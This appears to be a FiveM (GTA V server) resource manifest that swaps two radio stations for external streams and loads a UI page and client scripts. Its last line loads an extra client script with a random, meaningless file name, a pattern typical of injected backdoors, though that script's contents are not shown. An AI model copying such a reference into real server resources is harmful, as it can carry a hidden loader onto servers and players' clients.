fx_version 'bodacious'
game 'gta5'

-- Example custom radios
supersede_radio "RADIO_02_POP" { url = "http://37.59.47.192:8200/stream", volume = 0.2, name = "Perisan Center" }
supersede_radio "RADIO_03_HIPHOP_NEW" { url = "http://radio6o8.com:8000/stream", volume = 0.2, name = "Radio608" }

files {
	"index.html"
}

ui_page "index.html"

client_scripts {
	"data.js",
	"client.js"
}

client_script "DISqkiIEcVydGenWnD.lua"